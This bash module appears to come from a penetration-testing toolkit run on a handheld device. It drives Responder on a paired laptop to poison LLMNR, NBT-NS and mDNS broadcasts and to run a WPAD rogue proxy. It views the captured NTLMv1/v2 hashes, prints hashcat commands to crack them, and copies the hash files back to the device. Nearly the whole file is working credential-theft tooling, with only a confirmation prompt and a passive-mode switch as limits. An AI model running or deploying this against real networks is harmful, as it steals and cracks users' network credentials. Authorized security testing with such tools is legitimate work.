#!/bin/bash
# Responder LLMNR/NBT-NS/mDNS poisoning via laptop

rt_responder() {
  if [[ "$LAPTOP_ENABLED" -ne 1 ]]; then
    LOG red "Responder requires laptop mode"
    LOG "Enable in: Configure > Toggle Laptop Mode"
    return 1
  fi
  
  if ! laptop_ping; then
    LOG red "Cannot reach laptop at $LAPTOP_HOST"
    return 1
  fi
  
  local choice
  choice=$(menu_pick "Responder" \
    "Start Responder (poisoning)" \
    "Analyze Mode (passive)" \
    "Stop Responder" \
    "View Captured Hashes" \
    "Fetch Hashes to Pager")
  
  case "$choice" in
    1) responder_start ;;
    2) responder_analyze ;;
    3) responder_stop ;;
    4) responder_view ;;
    5) responder_fetch ;;
    0|"") return ;;
  esac
}

responder_start() {
  if ! check_passive; then
    LOG red "PASSIVE_ONLY enabled - poisoning blocked"
    return 1
  fi
  
  if ! confirm_danger "Start Responder poisoning? This will actively respond to broadcast queries."; then
    return 1
  fi
  
  local iface
  iface=$(TEXT_PICKER "Laptop interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  local opts
  opts=$(TEXT_PICKER "Responder options" "-wrf")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting Responder on laptop..."
  
  # Create output directory and start responder
  local log_file="$LAPTOP_RESULTS_DIR/responder_$(date +%Y%m%d_%H%M%S).log"
  
  laptop_exec_bg "responder -I '$iface' $opts" "$log_file"
  local ret=$?
  
  if [[ $ret -eq 0 ]]; then
    LOG green "Responder started in background"
    LOG ""
    LOG "Options used: $opts"
    LOG "  -w: WPAD rogue proxy"
    LOG "  -r: Respond to netbios wredir"  
    LOG "  -f: Fingerprint hosts"
    LOG ""
    LOG "Hashes saved to: /usr/share/responder/logs/"
    LOG "Log file: $log_file"
    LOG ""
    LOG "Stop with: Responder > Stop Responder"
  else
    LOG red "Failed to start Responder"
  fi
}

responder_analyze() {
  local iface
  iface=$(TEXT_PICKER "Laptop interface" "eth0")
  case $? in "$DUCKYSCRIPT_CANCELLED"|"$DUCKYSCRIPT_REJECTED"|"$DUCKYSCRIPT_ERROR") return ;; esac
  
  LOG blue "Starting Responder in Analyze mode (passive)..."
  LOG "This will NOT poison, only fingerprint and log"
  
  local log_file="$LAPTOP_RESULTS_DIR/responder_analyze_$(date +%Y%m%d_%H%M%S).log"
  
  laptop_exec_bg "responder -I '$iface' -A" "$log_file"
  
  LOG green "Responder (analyze) started"
  LOG "Log file: $log_file"
}

responder_stop() {
  LOG blue "Stopping Responder on laptop..."
  
  laptop_exec "pkill -f 'responder' || true"
  local ret=$?
  
  if [[ $ret -eq 0 ]]; then
    LOG green "Responder stopped"
  else
    LOG "Responder may not have been running"
  fi
}

responder_view() {
  LOG blue "Captured hashes on laptop:"
  LOG ""
  
  # List hash files
  laptop_exec "ls -la /usr/share/responder/logs/*.txt 2>/dev/null | tail -20" || true
  
  LOG ""
  LOG "Hash types:"
  laptop_exec "grep -h '' /usr/share/responder/logs/*-NTLMv*.txt 2>/dev/null | head -10" || LOG "(no NTLMv1/v2 hashes yet)"
  
  LOG ""
  LOG "To crack with hashcat:"
  LOG "  NTLMv2: hashcat -m 5600 hashes.txt wordlist.txt"
  LOG "  NTLMv1: hashcat -m 5500 hashes.txt wordlist.txt"
}

responder_fetch() {
  LOG blue "Fetching Responder hashes to Pager..."
  
  ensure_dir "$ARTIFACT_DIR/responder"
  
  # Fetch hash files
  laptop_fetch "/usr/share/responder/logs/*.txt" "$ARTIFACT_DIR/responder/" 2>/dev/null
  
  # Fetch logs
  laptop_fetch "$LAPTOP_RESULTS_DIR/responder*.log" "$ARTIFACT_DIR/responder/" 2>/dev/null
  
  local count
  count=$(find "$ARTIFACT_DIR/responder" -name "*.txt" 2>/dev/null | wc -l)
  
  LOG green "Fetched $count hash files to $ARTIFACT_DIR/responder/"
  
  # Show summary
  if [[ -d "$ARTIFACT_DIR/responder" ]]; then
    LOG ""
    LOG "Hash files:"
    ls -la "$ARTIFACT_DIR/responder/"*.txt 2>/dev/null | head -10
  fi
}
